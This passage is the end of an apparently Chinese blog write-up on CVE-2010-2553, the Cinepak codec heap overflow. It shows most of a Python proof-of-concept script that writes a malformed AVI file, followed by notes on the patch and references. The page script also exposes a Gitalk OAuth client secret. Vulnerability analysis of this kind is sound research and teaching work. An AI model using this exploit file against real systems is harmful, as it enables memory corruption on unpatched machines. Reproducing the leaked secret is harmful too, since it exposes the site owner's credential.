class="string">&quot;\x11\x00&quot;</span>                <span class="comment"># Strip CVID ID &lt;-----------+                           |   ; Strip CVID ID = 0x1100 - Inter-coded strip</span></span><br><span class="line">        <span class="string">&quot;\x00\x10&quot;</span>                <span class="comment"># Size of strip data        |                           |   ; Size of strip data = 0x10 = 16</span></span><br><span class="line">        <span class="string">&quot;\x41\x41&quot;</span>                <span class="comment"># Strips top Y position &quot;Strip Header&quot;                  |   ; Strips top Y position = 0x4141</span></span><br><span class="line">        <span class="string">&quot;\x41\x41&quot;</span>                <span class="comment"># Strips top X position     |                           |   ; Strips top X position = 0x4141</span></span><br><span class="line">        <span class="string">&quot;\x41\x41&quot;</span>                <span class="comment"># Strips bottom Y position  |                           |   ; Strips bottom Y position = 0x4141</span></span><br><span class="line">        <span class="string">&quot;\x41\x41&quot;</span>                <span class="comment"># Strips bottom X position&lt;-+                           |   ; Strips bottom X position = 0x4141</span></span><br><span class="line">        <span class="string">&quot;\x41\x41&quot;</span>                <span class="comment"># CVID Chunk ID &lt;-----------+ &quot;CVID Chunk&quot;              |   ; CVID Chunk ID = 0x4141</span></span><br><span class="line">        <span class="string">&quot;\x41\x41&quot;</span>                <span class="comment"># Size of chunk data(N) &lt;---+                           |   ; Size of chunk data = 0x4141</span></span><br><span class="line">        <span class="string">&quot;\x11\x00&quot;</span>                <span class="comment"># Strip CVID ID &lt;-----------+                           |   ; Strip CVID ID = 0x1100 - Inter-coded strip</span></span><br><span class="line">        <span class="string">&quot;\x00\x10&quot;</span>                <span class="comment"># Size of strip data        |                           |   ; Size of strip data = 0x10 = 16</span></span><br><span class="line">        <span class="string">&quot;\x41\x41&quot;</span>                <span class="comment"># Strips top Y position &quot;Strip Header&quot;                  |   ; Strips top Y position = 0x4141</span></span><br><span class="line">        <span class="string">&quot;\x41\x41&quot;</span>                <span class="comment"># Strips top X position     |                           |   ; Strips top X position = 0x4141</span></span><br><span class="line">        <span class="string">&quot;\x41\x41&quot;</span>                <span class="comment"># Strips bottom Y position  |                           |   ; Strips bottom Y position = 0x4141</span></span><br><span class="line">        <span class="string">&quot;\x41\x41&quot;</span>                <span class="comment"># Strips bottom X position&lt;-+                           |   ; Strips bottom X position = 0x4141</span></span><br><span class="line">        <span class="string">&quot;\x41\x41&quot;</span>                <span class="comment"># CVID Chunk ID &lt;-----------+ &quot;CVID Chunk&quot;              |   ; CVID Chunk ID = 0x4141</span></span><br><span class="line">        <span class="string">&quot;\x41\x41&quot;</span>                <span class="comment"># Size of chunk data(N) &lt;---+                           |   ; Size of chunk data = 0x4141</span></span><br><span class="line">        <span class="string">&quot;\x11\x00&quot;</span>                <span class="comment"># Strip CVID ID &lt;-----------+                           |   ; Strip CVID ID = 0x1100 - Inter-coded strip</span></span><br><span class="line">        <span class="string">&quot;\x00\x10&quot;</span>                <span class="comment"># Size of strip data    &quot;Strip Header&quot;                  |   ; Size of strip data = 0x10 = 16</span></span><br><span class="line">        <span class="string">&quot;\x41\x00&quot;</span>                <span class="comment"># Strips top Y position&lt;----+---------------------------+   ; Strips top Y position = 0x4141</span></span><br><span class="line">        )               </span><br><span class="line">  </span><br><span class="line">    idx_tag =    (</span><br><span class="line">        <span class="string">&quot;\x69\x64\x78\x31&quot;</span>    <span class="comment"># dwFourCC = &quot;idx1&quot; &lt;-----------+ </span></span><br><span class="line">        <span class="string">&quot;\x10\x00\x00\x00&quot;</span>    <span class="comment"># dwSize = 0x10 = 16 byte       | </span></span><br><span class="line">        <span class="string">&quot;\x30\x30\x64\x63&quot;</span>        <span class="comment"># dwChunkId = &quot;00dc&quot;     &quot;idx1&quot; </span></span><br><span class="line">        <span class="string">&quot;\x10\x00\x00\x00&quot;</span>        <span class="comment"># dwFlags = 0x10            | </span></span><br><span class="line">        <span class="string">&quot;\x04\x00\x00\x00&quot;</span>        <span class="comment"># dwOffset = 0x4            | </span></span><br><span class="line">        <span class="string">&quot;\x68\x00\x00\x00&quot;</span>        <span class="comment"># dwSize = 0x68 &lt;-----------+ </span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    avifile = <span class="built_in">open</span>(<span class="string">&#x27;poc3.avi&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>)</span><br><span class="line">    avifile.write(aviHeaders)</span><br><span class="line">    avifile.write(padding)</span><br><span class="line">    avifile.write(movi_tag)</span><br><span class="line">    avifile.write(cinepak_codec_data1)</span><br><span class="line">    avifile.write(number_of_coded_strips)</span><br><span class="line">    avifile.write(cinepak_codec_data2)</span><br><span class="line">    avifile.write(idx_tag)</span><br><span class="line">  </span><br><span class="line">    avifile.close()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[-] AVI file generated&#x27;</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div><p>EXP 的内容即为把手搓的二进制文件内容塞到 .avi 文件里，参照注释理解即可</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>该漏洞的修复在 iccvid.dll 1.10.0.12 -&gt; 1.1.0.0.13 的补丁中。补丁为 Number of coded strips 设置了阈值，其值大于 3 时将会被修改为 3，进而限制了堆内存复制的次数以避免堆溢出的发生</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a class="link" target="_blank" rel="noopener external nofollow noreferrer" href="https://nvd.nist.gov/vuln/detail/CVE-2010-2553">NVD - CVE-2010-2553<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link" target="_blank" rel="noopener external nofollow noreferrer" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2553">CVE - CVE-2010-2553<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link" target="_blank" rel="noopener external nofollow noreferrer" href="https://www.cvedetails.com/cve/CVE-2010-2553/">CVEdetails.com - CVE-2010-2553<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/advisories/GHSA-xf3m-5jrg-2cr8">Github - CVE-2010-2553<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link" target="_blank" rel="noopener external nofollow noreferrer" href="https://learn.microsoft.com/zh-cn/security-updates/securitybulletins/2010/ms10-055">Microsoft 安全公告 MS10-055 - 严重<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link" target="_blank" rel="noopener external nofollow noreferrer" href="https://www.exploit-db.com/exploits/15112">EXPLOIT DATABASE - Microsoft Cinepak Codec CVDecompress - Heap Overflow (MS10-055)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link" target="_blank" rel="noopener external nofollow noreferrer" href="https://book.douban.com/subject/26830238/">漏洞战争<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link" target="_blank" rel="noopener external nofollow noreferrer" href="http://multimedia.cx/mirror/cinepak.txt">Cinepak(CVID) stream format for AVI and QT<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link" target="_blank" rel="noopener external nofollow noreferrer" href="https://sp4n9x.github.io/2020/12/30/AVI%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/">sp4n9x’s Blog - AVI 文件格式分析<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link" target="_blank" rel="noopener external nofollow noreferrer" href="https://sp4n9x.github.io/2021/01/10/CVE-2010-2553%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/">sp4n9x’s Blog - CVE-2010-2553 复现与分析<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p></div><div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8"><div class="article-copyright-info-container"><ul><li><strong>Title:</strong> CVE-2010-2553 Investigation</li><li><strong>Author:</strong> 7erry</li><li><strong>Created at :</strong> 2024-09-09 13:35:03</li><li><strong>Updated at :</strong> 2024-09-09 13:35:03</li><li><strong>Link:</strong> https://7erryx.github.io/2024/09/09/Vulnerability Investigation/CVE-2010-2553-Investigation/</li><li><strong>License: </strong>This work is licensed under <a class="license" target="_blank" rel="noopener external nofollow noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.</li></ul></div></div><div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8"><div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2"><a class="prev" rel="prev" href="/2024/09/19/Vulnerability%20Investigation/CVE-2012-0003-Investigation/"><span class="left arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-left"></i> </span><span class="title flex justify-center items-center"><span class="post-nav-title-item truncate max-w-48">CVE-2012-0003 Investigation</span> <span class="post-nav-item">Prev posts</span></span></a></div><div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2"><a class="next" rel="next" href="/2024/08/18/Vulnerability%20Investigation/CVE-2012-0158-Investigation/"><span class="title flex justify-center items-center"><span class="post-nav-title-item truncate max-w-48">CVE-2012-0158 Investigation</span> <span class="post-nav-item">Next posts</span> </span><span class="right arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-right"></i></span></a></div></div><div class="comment-container px-2 sm:px-6 md:px-8 pb-8"><div class="comments-container mt-10 w-full"><div id="comment-anchor" class="w-full h-2.5"></div><div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">Comments</div><div id="gitalk-container"></div><script data-swup-reload-script src="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js"></script><script data-swup-reload-script>function loadGitalk(){let e=decodeURI(location.pathname);e.length>50&&(e=e.substring(0,47)+"...");try{Gitalk&&new Gitalk({clientID:"Ov23libH3Xd9PxVu3LCR",clientSecret:"94e9555f77e9a3f938f8cf232d497375d8cc156f",repo:"7erryX.github.io",owner:"7erryX",admin:["7erryX"],id:e,language:"en, zh-CN",proxy:"https://github.com/login/oauth/access_token"}).render("gitalk-container")}catch(e){window.Gitalk=null}}{const e=setTimeout(()=>{loadGitalk(),clearTimeout(e)},1e3)}</script></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><div class="toc-title">On this page</div><div class="page-title">CVE-2010-2553 Investigation</div><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#RIFF-%E6%96%87%E4%BB%B6%E5%8F%8A%E5%85%B6%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="nav-text">RIFF 文件及其基本数据结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AVI-%E6%96%87%E4%BB%B6%E5%8F%8A%E5%85%B6%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="nav-text">AVI 文件及其基本数据结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cinepak-Stream-Format"><span class="nav-text">Cinepak Stream Format</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-%E5%88%86%E6%9E%90"><span class="nav-text">Exploit 分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-text">漏洞修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reference"><span class="nav-text">Reference</span></a></li></ol></div></div></div></div></div></div><div class="main-content-footer"><footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color"><div class="info-container py-3 text-center"><div class="text-center">&copy; <span>2020</span> - 2026&nbsp;&nbsp;<i class="fa-regular fa-computer-classic"></i>&nbsp;&nbsp;<a href="/">7erry</a><p class="post-count space-x-0.5"><span>83 posts in total </span><span>227.2k words in total</span></p></div><script data-swup-reload-script src="https://cn.vercount.one/js"></script><div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right"><span id="busuanzi_container_site_uv" class="lg:!block"><span class="text-sm">VISITOR COUNT</span> <span id="busuanzi_value_site_uv"></span> </span><span id="busuanzi_container_site_pv" class="lg:!block"><span class="text-sm">TOTAL PAGE VIEWS</span> <span id="busuanzi_value_site_pv"></span></span></div><div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left"><span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io" rel="external nofollow noreferrer">Hexo</a></span> <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine" rel="external nofollow noreferrer">Redefine v2.8.5</a></span></div><div>Blog up for <span class="odometer" id="runtime_days"></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec</div><script data-swup-reload-script>try{function odometer_init(){document.querySelectorAll(".odometer").forEach(e=>{new Odometer({el:e,format:"( ddd).dd",duration:200})})}odometer_init()}catch(e){}</script></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="article-tools-list"><li class="right-bottom-tools page-aside-toggle"><i class="fa-regular fa-outdent"></i></li><li class="go-comment"><i class="fa-regular fa-comments"></i></li></ul></div></div><div class="right-side-tools-container"><div class="side-tools-container"><ul class="hidden-tools-list"><li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-plus"></i></li><li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-minus"></i></li><li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center"><i class="fa-regular fa-moon"></i></li><li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center"><i class="fa-regular fa-arrow-down"></i></li></ul><ul class="visible-tools-list"><li class="right-bottom-tools toggle-tools-list flex justify-center items-center"><i class="fa-regular fa-cog fa-spin"></i></li><li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="image-viewer-container"><img src=""></div><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-input-field-pre"><i class="fa-solid fa-keyboard"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa-solid fa-times"></i></span></div><div id="search-result"><div id="no-result"><i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i></div></div></div></div></main><script src="/js/build/libs/Swup.min.js"></script><script src="/js/build/libs/SwupSlideTheme.min.js"></script><script src="/js/build/libs/SwupScriptsPlugin.min.js"></script><script src="/js/build/libs/SwupProgressPlugin.min.js"></script><script src="/js/build/libs/SwupScrollPlugin.min.js"></script><script src="/js/build/libs/SwupPreloadPlugin.min.js"></script><script>const swup=new Swup({plugins:[new SwupScriptsPlugin({optin:!0}),new SwupProgressPlugin,new SwupScrollPlugin({offset:80}),new SwupSlideTheme({mainElement:".main-content-body"}),new SwupPreloadPlugin],containers:["#swup"]})</script><script src="/js/build/tools/imageViewer.js" type="module"></script><script src="/js/build/utils.js" type="module"></script><script src="/js/build/main.js" type="module"></script><script src="/js/build/layouts/navbarShrink.js" type="module"></script><script src="/js/build/tools/scrollTopBottom.js" type="module"></script><script src="/js/build/tools/lightDarkSwitch.js" type="module"></script><script src="/js/build/layouts/categoryList.js" type="module"></script><script src="/js/build/tools/localSearch.js" type="module"></script><script src="/js/build/tools/codeBlock.js" type="module"></script><script src="/js/build/layouts/lazyload.js" type="module"></script><script src="/js/build/tools/runtime.js"></script><script src="/js/build/libs/odometer.min.js"></script><link rel="stylesheet" href="/assets/odometer-theme-minimal.css"><script src="/js/build/libs/Typed.min.js"></script><script src="/js/build/plugins/typed.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/mermaid@9.3.0/dist/mermaid.min.js"></script><script src="/js/build/plugins/mermaid.js"></script><script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script><script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script><script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script><script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script><script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script></body></html>